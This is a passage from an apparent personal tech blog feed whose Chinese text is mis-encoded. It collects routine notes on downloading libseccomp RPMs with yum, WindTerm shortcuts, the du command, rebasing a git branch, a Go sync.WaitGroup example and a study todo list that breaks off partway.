class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br>yum list --showduplicates  | grep libseccomp<br>yum install --downloadonly --downloaddir . libseccomp<br>yum install --downloadonly --downloaddir . libseccomp*<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp</span><br>Last metadata expiration check: 0:01:35 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                           Architecture                   Version                                      Repository                                    Size<br>==================================================================================================================================================================<br>Upgrading:<br> libseccomp                        aarch64                        2.5.2-1.0.4.uelc20.01                        UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Upgrade  1 Package<br><br>Total download size: 69 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: N<br>Operation aborted.<br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp*</span><br>Last metadata expiration check: 0:01:46 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                               Architecture                Version                                     Repository                                    Size<br>==================================================================================================================================================================<br>Installing:<br> libseccomp-devel                      aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-AppStream                      56 k<br> libseccomp-static                     aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-Plus                           67 k<br>Upgrading:<br> libseccomp                            aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Install  2 Packages<br>Upgrade  1 Package<br><br>Total download size: 192 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: y<br>Downloading Packages:<br>(1/3): libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                                34 MB/s |  69 kB     00:00    <br>(2/3): libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                         3.1 MB/s |  56 kB     00:00    <br>(3/3): libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                        286 kB/s |  67 kB     00:00    <br>------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                             822 kB/s | 192 kB     00:00     <br>Complete!<br>The downloaded packages were saved <span class="hljs-keyword">in</span> cache until the next successful transaction.<br>You can remove cached packages by executing <span class="hljs-string">&#x27;yum clean packages&#x27;</span>.<br><br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># ll</span><br>total 200<br>-rw-r----- 1 root root 71080 Jun 15 14:23 libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 57748 Jun 15 14:23 libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 68128 Jun 15 14:23 libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€WindTermã€‘(202303) WindTermå…¨å®¶æ¡¶</title>
    <link href="/2023/03/24/software/%E3%80%90WindTerm%E3%80%91(202303)%20WindTerm%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    <url>/2023/03/24/software/%E3%80%90WindTerm%E3%80%91(202303)%20WindTerm%E5%85%A8%E5%AE%B6%E6%A1%B6/</url>
    
    <content type="html"><![CDATA[<p>ä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/kingToolbox/WindTerm/releases">https://github.com/kingToolbox/WindTerm/releases</a></p><p>windowså…å®‰è£…è§£å‹å³ç”¨</p><h2 id="æ·»åŠ å¿«æ·å‘½ä»¤ï¼ˆ20230324ï¼‰"><a href="#æ·»åŠ å¿«æ·å‘½ä»¤ï¼ˆ20230324ï¼‰" class="headerlink" title="æ·»åŠ å¿«æ·å‘½ä»¤ï¼ˆ20230324ï¼‰"></a>æ·»åŠ å¿«æ·å‘½ä»¤ï¼ˆ20230324ï¼‰</h2><h3 id="æ·»åŠ "><a href="#æ·»åŠ " class="headerlink" title="æ·»åŠ "></a>æ·»åŠ </h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004239.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004419.png" alt="image.png"></p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004502.png" alt="image.png"></p><p>å¦‚éœ€å›è½¦ï¼Œå¯ä»¥å†™æˆ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl list-units\r<br></code></pre></td></tr></table></figure><h2 id="å¼€å¯å³é”®ç²˜è´´ï¼ˆ20230717ï¼‰"><a href="#å¼€å¯å³é”®ç²˜è´´ï¼ˆ20230717ï¼‰" class="headerlink" title="å¼€å¯å³é”®ç²˜è´´ï¼ˆ20230717ï¼‰"></a>å¼€å¯å³é”®ç²˜è´´ï¼ˆ20230717ï¼‰</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190533.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190641.png" alt="image.png"></p><h2 id="è‡ªåŠ¨å¤åˆ¶é€‰ä¸­å†…å®¹ï¼ˆ20230717ï¼‰"><a href="#è‡ªåŠ¨å¤åˆ¶é€‰ä¸­å†…å®¹ï¼ˆ20230717ï¼‰" class="headerlink" title="è‡ªåŠ¨å¤åˆ¶é€‰ä¸­å†…å®¹ï¼ˆ20230717ï¼‰"></a>è‡ªåŠ¨å¤åˆ¶é€‰ä¸­å†…å®¹ï¼ˆ20230717ï¼‰</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190759.png" alt="image.png"></p><h2 id="æ–°å»ºä¼šè¯ï¼ˆ20230717ï¼‰"><a href="#æ–°å»ºä¼šè¯ï¼ˆ20230717ï¼‰" class="headerlink" title="æ–°å»ºä¼šè¯ï¼ˆ20230717ï¼‰"></a>æ–°å»ºä¼šè¯ï¼ˆ20230717ï¼‰</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717191610.png" alt="image.png"></p><h2 id="æ”¾å¤§å­—ä½“ï¼ˆ20230717ï¼‰"><a href="#æ”¾å¤§å­—ä½“ï¼ˆ20230717ï¼‰" class="headerlink" title="æ”¾å¤§å­—ä½“ï¼ˆ20230717ï¼‰"></a>æ”¾å¤§å­—ä½“ï¼ˆ20230717ï¼‰</h2><p>å¦‚æœæ„Ÿè§‰å­—ä½“æ¯”è¾ƒå°çš„è¯ï¼Œå¯ä»¥ç›´æ¥æŒ‰ä½ã€Œctrl +ã€ä¸¤ä¸ªç»„åˆé”®æ”¾å¤§å­—ä½“ã€‚</p><p>æ”¾å¤§ä¹‹åï¼Œå…³é—­è½¯ä»¶ï¼Œé‡æ–°æ‰“å¼€ï¼Œè¿˜æ˜¯æ”¾å¤§åçš„å­—ä½“ã€‚</p><h2 id="åˆ‡æ¢æ ‡ç­¾ï¼ˆ20230717ï¼‰"><a href="#åˆ‡æ¢æ ‡ç­¾ï¼ˆ20230717ï¼‰" class="headerlink" title="åˆ‡æ¢æ ‡ç­¾ï¼ˆ20230717ï¼‰"></a>åˆ‡æ¢æ ‡ç­¾ï¼ˆ20230717ï¼‰</h2><p><code>Alt + 1</code>ï¼šåˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªæ ‡ç­¾ï¼Œå…¶ä»–æ ‡ç­¾ç”¨<code>Alt+æ ‡ç­¾åºå·</code>å³å¯ã€‚</p><h2 id="éšè—-x2F-æ‰“å¼€èœå•æ ï¼šAlt-w-Alt-mï¼ˆ20230717ï¼‰"><a href="#éšè—-x2F-æ‰“å¼€èœå•æ ï¼šAlt-w-Alt-mï¼ˆ20230717ï¼‰" class="headerlink" title="éšè—&#x2F;æ‰“å¼€èœå•æ ï¼šAlt+w Alt+mï¼ˆ20230717ï¼‰"></a>éšè—&#x2F;æ‰“å¼€èœå•æ ï¼šAlt+w Alt+mï¼ˆ20230717ï¼‰</h2><p>åŸæ ·</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717194719.png" alt="image.png"></p><p>æŒ‰é”®ï¼šAlt+w Alt+mï¼Œ æ˜¾ç¤ºå¦‚ä¸‹ï¼Œèœå•æ æ²¡æœ‰äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717194839.png" alt="image.png"></p><p>å†æ¬¡æŒ‰é”®ï¼šAlt+w Alt+m</p><p>èœå•æ åˆå›æ¥äº†</p><h2 id="éšè—-x2F-æ‰“å¼€çŠ¶æ€æ ï¼šAlt-w-Alt-uï¼ˆ20230717ï¼‰"><a href="#éšè—-x2F-æ‰“å¼€çŠ¶æ€æ ï¼šAlt-w-Alt-uï¼ˆ20230717ï¼‰" class="headerlink" title="éšè—&#x2F;æ‰“å¼€çŠ¶æ€æ ï¼šAlt+w Alt+uï¼ˆ20230717ï¼‰"></a>éšè—&#x2F;æ‰“å¼€çŠ¶æ€æ ï¼šAlt+w Alt+uï¼ˆ20230717ï¼‰</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195201.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195121.png" alt="image.png"></p><h2 id="éšè—-x2F-æ‰“å¼€å¿«æ·æ ï¼šAlt-w-Alt-qï¼ˆ20230717ï¼‰"><a href="#éšè—-x2F-æ‰“å¼€å¿«æ·æ ï¼šAlt-w-Alt-qï¼ˆ20230717ï¼‰" class="headerlink" title="éšè—&#x2F;æ‰“å¼€å¿«æ·æ ï¼šAlt+w Alt+qï¼ˆ20230717ï¼‰"></a>éšè—&#x2F;æ‰“å¼€å¿«æ·æ ï¼šAlt+w Alt+qï¼ˆ20230717ï¼‰</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195333.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195441.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202303) å¸¸ç”¨å‘½ä»¤ï¼šdu</title>
    <link href="/2023/03/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202303)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adu/"/>
    <url>/2023/03/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202303)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adu/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">-s, --summarize<br>       display only a total <span class="hljs-keyword">for</span> each argument<br>-h, --human-readable<br>       <span class="hljs-built_in">print</span> sizes <span class="hljs-keyword">in</span> human readable format (e.g., 1K 234M 2G)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è®¡ç®—å½“å‰æ–‡ä»¶å¤¹çš„æ€»ç£ç›˜å ç”¨é‡</span><br><span class="hljs-comment"># -sé€‰é¡¹è¡¨ç¤ºè®¡ç®—æ€»å’Œ, -hé€‰é¡¹è¡¨ç¤ºä»¥æ°å½“çš„K/M/Gå•ä½å±•ç¤º</span><br>[root@ningan ~]<span class="hljs-comment"># du -sh</span><br>13G     .<br>[root@ningan ~]<span class="hljs-comment"># du -sh .</span><br>13G     .<br><br><br><br><span class="hljs-comment"># å±•ç¤ºæ¯ä¸€ä¸ªå‚æ•°å¯¹åº”çš„ç£ç›˜ç©ºé—´ä½¿ç”¨é‡</span><br><span class="hljs-comment"># é€šé…å½¢å¼çš„å‚æ•°é¦–å…ˆè¢«Shellè§£æ, ç„¶å-sé€‰é¡¹å‘æŒ¥ä½œç”¨, å±•ç¤ºæ¯ä¸€ä¸ªå‚æ•°å¯¹åº”çš„ç£ç›˜ç©ºé—´ä½¿ç”¨é‡</span><br>[root@ningan ~]<span class="hljs-comment"># du -sh *</span><br>564M    bcc<br>31M     bpftrace<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€gitã€‘git graph</title>
    <link href="/2023/03/23/git/%E3%80%90git%E3%80%91git%20graph/"/>
    <url>/2023/03/23/git/%E3%80%90git%E3%80%91git%20graph/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼šmasterå’Œfeatureåˆ†æ”¯ï¼Œæˆ‘åœ¨featureåˆ†æ”¯ä¸Šå¼€å‘ï¼Œå‘ç°masterä¸Šé¢æäº¤äº†æ–°çš„å†…å®¹ï¼Œæˆ‘æƒ³æŠŠmasterä¸Šæ–°çš„å†…å®¹ä¹Ÿæ”¾åˆ°æˆ‘çš„featureåˆ†æ”¯ä¸Šï¼ŒåŸºäºè¿™äº›æ–°çš„å†…å®¹æ¥å¼€å‘featureåˆ†æ”¯</p><p>æœ¬æ¥æƒ³ç”¨vscodeä¸­çš„git graphæ’ä»¶ï¼Œå¿«é€Ÿè§£å†³è¯¥é—®é¢˜ã€‚ä½†æ˜¯vscodeè£…ä¸ä¸Šgit graphæ’ä»¶ï¼Œå½“æ—¶ä¸ºäº†è§£å†³é—®é¢˜ï¼Œåªå¥½å…ˆé€šè¿‡å‘½ä»¤è¡Œçš„æ–¹å¼æ¥æã€‚</p><p>ä»¥ä¸‹ä¸ºå‘½ä»¤è¡Œçš„æ–¹å¼è§£å†³çš„è¯¥é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout master<br>git pull<br>git checkout feature_iaasnodescontroller<br>git rebase master<br>åœ¨è¿™ä¸ªfeature_iaasnodescontrollerçš„åˆ†æ”¯æ‰§è¡Œgit <span class="hljs-built_in">log</span> å°±èƒ½çœ‹åˆ°masterä¸Šé¢å‰é¢åšçš„æäº¤äº†<br><span class="hljs-comment"># å¼ºåˆ¶æŠŠæœ¬åœ°åˆ†æ”¯åŒæ­¥åˆ°è¿œç¨‹åˆ†æ”¯</span><br>git push origin feature_iaasnodescontroller --force<br><br><br><span class="hljs-comment"># å…¶ä»–ç›¸å…³å‘½ä»¤</span><br> git <span class="hljs-built_in">log</span> --all --pretty=oneline --abbrev-commit --graph<br> git <span class="hljs-built_in">log</span> --oneline<br> git <span class="hljs-built_in">log</span> --oneline --graph<br></code></pre></td></tr></table></figure><p>åæ¥å‘ç°vscodeè£…ä¸ä¸Šæ’ä»¶æ˜¯å› ä¸ºå¼€äº†ä»£ç†ï¼ŒæŠŠä»£ç†å…³äº†å°±å¯ä»¥è£…ä¸Šæ’ä»¶äº†</p><h2 id="git-graph"><a href="#git-graph" class="headerlink" title="git graph"></a>git graph</h2><p>HEADæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆï¼ŒæŒ‡å‘å½“å‰æ‰€åœ¨çš„æœ¬åœ°åˆ†æ”¯ã€‚<br>å½“æˆ‘ä»¬æ‰§è¡Œ<code>git checkout testing</code>åˆ‡æ¢åˆ°testingåˆ†æ”¯æ—¶ï¼ŒHEADå°±ä¼šæŒ‡å‘testingã€‚</p><p>Graphå›¾ä¸­çš„ç‚¹å°±æ˜¯ä¸€ä¸ªæäº¤å¯¹è±¡æˆ–è€…å«ä¸€æ¬¡æäº¤è®°å½•ã€‚</p><p>å»ºä¸€ä¸ªæ–°çš„ git é¡¹ç›®ï¼Œç„¶åæŠŠä½ çŸ¥é“çš„æ‰€æœ‰æ“ä½œéƒ½æ¥ä¸Šä¸€éï¼Œä¸€è¾¹åšä¸€è¾¹çœ‹è¿™ä¸ªå›¾æ€ä¹ˆå˜çš„ã€‚æä¸€æ¬¡å°±æ‡‚ï¼Œç»ˆèº«éš¾å¿˜ã€‚</p><p>è‡ªå·±å»ºä¸€ä¸ªrepoï¼Œå¤šæå‡ ä¸ªbranchï¼Œä¿®æ”¹ä¹‹åå°±æ¥å›æ¥å»mergeã€rebaseä¸€ä¸‹ï¼Œç©å„¿ä¸€ä¸ªå‘¨æœ«å°±æ‡‚äº†</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://segmentfault.com/q/1010000007376119">å¦‚ä½•çœ‹æ‡‚gitçš„ graphå›¾ï¼Ÿ</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘sync.WaitGroup</title>
    <link href="/2023/03/21/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91sync.WaitGroup/"/>
    <url>/2023/03/21/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91sync.WaitGroup/</url>
    
    <content type="html"><![CDATA[<h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>å®˜æ–¹æ–‡æ¡£å¯¹ WaitGroup çš„æè¿°æ˜¯ï¼š<code>ä¸€ä¸ª WaitGroup å¯¹è±¡å¯ä»¥ç­‰å¾…ä¸€ç»„åç¨‹ç»“æŸ</code>ã€‚ä½¿ç”¨æ–¹æ³•æ˜¯ï¼š</p><ol><li>main åç¨‹é€šè¿‡è°ƒç”¨Â <code>wg.Add(delta int)</code>Â è®¾ç½® worker åç¨‹çš„ä¸ªæ•°ï¼Œç„¶ååˆ›å»º worker åç¨‹ï¼›</li><li>worker åç¨‹æ‰§è¡Œç»“æŸä»¥åï¼Œéƒ½è¦è°ƒç”¨Â <code>wg.Done()</code>ï¼›</li><li>main åç¨‹è°ƒç”¨Â <code>wg.Wait()</code>Â ä¸”è¢« blockï¼Œç›´åˆ°æ‰€æœ‰ worker åç¨‹å…¨éƒ¨æ‰§è¡Œç»“æŸåè¿”å›ã€‚</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>ä¸¾ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜è¿™ä¸ªé—®é¢˜</p><p>ä¸‹é¢ä¸‰ä¸ªå°demoå¯ä»¥å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸‹ä¸€ä¸ªéƒ½æ¯”ä¸Šä¸€ä¸ªæ›´åŠ çš„ä¼˜é›…</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-comment">// // æ–¹æ³•1</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// for i := 0; i &lt; 100; i++ &#123;</span><br><span class="hljs-comment">// go fmt.Println(i)</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// time.Sleep(time.Second)</span><br><span class="hljs-comment">// &#125;</span><br><br><br><br><span class="hljs-comment">// // æ–¹æ³•2</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// num := 100</span><br><span class="hljs-comment">// c := make(chan bool, num)</span><br><span class="hljs-comment">// for i := 0; i &lt; num; i++ &#123;</span><br><span class="hljs-comment">// go func(i int) &#123;</span><br><span class="hljs-comment">// fmt.Println(i)</span><br><span class="hljs-comment">// c &lt;- true</span><br><span class="hljs-comment">// &#125;(i)</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// for i := 0; i &lt; num; i++ &#123;</span><br><span class="hljs-comment">// &lt;-c</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><br><br><br><span class="hljs-comment">// æ–¹æ³•3</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>wg := sync.WaitGroup&#123;&#125;<br>num := <span class="hljs-number">10</span><br>wg.Add(num)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; num; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-comment">// wg.Done() // ä½ç½®1  æ”¾è¿™ä¼šæœ‰é—®é¢˜  å¦‚æœè¦æ”¾åœ¨è¿™ï¼Œéœ€è¦å†™æˆdefer wg.Done()</span><br>fmt.Println(i)<br>wg.Done() <span class="hljs-comment">// ä½ç½®2</span><br>&#125;(i)<br>&#125;<br>wg.Wait()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¯¹äºæ–¹æ³•3æ¥è¯´ï¼Œwg.Done()è¦æ”¾åœ¨å†™æˆç»“æŸä¹‹åï¼Œå¦åˆ™å°±ä¼šæœ‰é—®é¢˜</p><p>å½“wg.Done()æ”¾åœ¨ä½ç½®1å¤„ï¼Œå¦‚ä¸‹ä¸ºä¸¤æ¬¡è¿è¡Œä»£ç çš„ç»“æœã€‚å¯ä»¥çœ‹åˆ°ï¼Œå¾ˆå¯èƒ½åœ¨åç¨‹è¿˜æ²¡æœ‰å¼€å§‹è¿è¡Œï¼Œä¸»è¿›ç¨‹å°±ç»“æŸäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############## wg.Done()æ”¾åœ¨ä½ç½®1å¤„ ##############</span><br><span class="hljs-comment"># go run main.go</span><br>9<br>2<br>0<br><span class="hljs-comment"># go run main.go</span><br>9<br>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br><br></code></pre></td></tr></table></figure><p>wg.Done()æ”¾åœ¨ä½ç½®2å¤„å°±æ²¡æœ‰é—®é¢˜äº†ï¼Œæ¯æ¬¡å½“åç¨‹è¿è¡Œç»“æŸä¹‹åæ‰å°†waitGroupä¸­çš„åç¨‹å‡1ï¼Œå°±ä¸ä¼šæœ‰å½±å“äº†~</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://studygolang.com/articles/12972"># Golang sync.WaitGroupçš„ç”¨æ³•</a><br><a href="https://www.ququ123.top/2022/04/golang_wait_group_principle/">sync.WaitGroup è¯¦è§£</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>todolist</title>
    <link href="/2023/03/03/TODO/todolist/"/>
    <url>/2023/03/03/TODO/todolist/</url>
    
    <content type="html"><![CDATA[<p>ã€å·¥ä½œäºŸå¾…å­¦ä¹ ã€‘<br>ã€ebpfã€‘</p><ul><li><input disabled="" type="checkbox"> åˆ©ç”¨Â ebpfÂ sockmap&#x2F;redirectionÂ æå‡Â socketÂ æ€§èƒ½ï¼ˆ2020ï¼‰ <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> å›¾è§£eBPFÂ socketÂ levelÂ é‡å®šå‘çš„å†…æ ¸å®ç°ç»†èŠ‚   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> å›¾è§£Linuxç½‘ç»œåŒ…æ¥æ”¶è¿‡ç¨‹   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> å†…åŠŸä¿®ç‚¼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf  github handbook</li><li><input disabled="" type="checkbox"> ebpf ã€Šebpfä¹‹å·…ã€‹ ç¬¬10ç«  ç½‘ç»œ<br>ã€å·¥å…·ç±»ã€‘</li><li><input disabled="" type="checkbox"> obçš„excalidraw</li></ul><p>ã€æŠ€æœ¯ç±»ã€‘</p><ul><li><input disabled="" type="checkbox"> ç¼–è¯‘dlv x86å’Œarm</li><li><input disabled="" type="checkbox"> æ™®ç½—ç±³ä¿®æ–¯ exporter</li><li><input disabled="" type="checkbox"> code-generator</li><li><input disabled="" type="checkbox"> kubectl alias å‘½ä»¤è‡ªåŠ¨è¡¥å…¨</li><li><input disabled="" type="checkbox"> go é˜»å¡ éé˜»å¡</li><li><input disabled="" type="checkbox"> vscodeä¸­gitçš„å¿«æ·ä½¿ç”¨</li><li><input disabled="" type="checkbox"> containerd é…ç½®æ–‡ä»¶</li></ul><p>ã€ä¹¦ç±ç±»ã€‘</p><ul><li><input disabled="" type="checkbox"> goå¹¶å‘</li><li><input disabled="" type="checkbox"> linuxå†…æ 